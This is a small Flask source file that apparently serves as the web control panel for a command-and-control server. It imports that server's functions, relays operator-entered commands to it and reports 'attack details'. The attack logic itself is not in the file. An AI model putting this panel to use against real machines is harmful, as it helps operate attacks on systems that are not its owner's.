from flask import Flask, request, render_template
from CC_server import main, getAttackDetails, setCommand
import threading

app = Flask(__name__)

@app.route('/hello/<name>')
def hello_name(name):
   return 'Hello %s!' % name

@app.route('/home', methods=['GET'])
def home():
   return render_template('command_line.html')

@app.route('/attack_details', methods=['GET'])
def attack_details():
   return getAttackDetails()

@app.route('/command', methods=['POST'])
def command_line():
   cmd = request.form['command']
   setCommand(cmd)
   return render_template('command_line.html')

def runCCServer():
   CC_thread = threading.Thread(target=main, daemon=True)
   CC_thread.start()


def runServer():
   runCCServer()
   app.run(debug=False, use_reloader=False, host='0.0.0.0')

if __name__ == "__main__":
    try:
        runServer()
    except KeyboardInterrupt:
        print("Shutting down...")
        exit(0)